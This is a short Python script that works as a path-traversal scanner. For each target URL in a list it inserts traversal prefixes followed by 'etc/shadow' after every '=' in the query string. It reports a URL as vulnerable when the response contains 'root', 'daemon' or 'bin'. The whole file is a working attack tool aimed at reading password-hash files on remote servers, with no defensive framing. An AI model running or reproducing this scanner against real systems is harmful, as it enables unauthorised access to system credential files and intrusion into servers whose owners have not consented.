import re
import requests
import time
import os
def main():

    # Inputs
    # -----------------------------------------------

    f = open(f"{os.path.dirname(__file__)}/prefixes.txt", "r") # filename of Prefix
    prefixes = re.split("\n", str(f.read()))
    del prefixes[-1]
    f.close()

    f = open("urls", "r") # filename of targets
    targets = re.split("\n", str(f.read()))
    f.close()

    suffixes = ["etc/shadow"] # suffix
    
    delay = 1 # time of delay between every request

    # -----------------------------------------------

    # for every url
    for target in targets:
        # for every prefix
        for prefix in prefixes:
            # for every suffix
            for suffix in suffixes:

                payload = prefix + suffix # declare payload
                query = "=" # declare query
                r = re.compile(query) # compile
                position = [[m.start(),m.end()] for m in r.finditer(target)] # find all positions of "=" in {target}

                for i, j in position: # for number of "=" in target
                    if i == [] or j == []:
                        break
                    else:
                        url = list(target) # copy var
                        url[j:] = payload # replace "=" with "=" + payload
                        url = ''.join(url)
                        try:
                            res = requests.get(url) # request
                            time.sleep(delay) # delay
                            # if content in ["daemon" or "root" or "bin"]
                            if re.search("daemon", str(res.content)) or re.search("root", str(res.content)) or re.search("bin", str(res.content)):
                                print(url) # vuln                
                        except: pass


# Run Function
main()
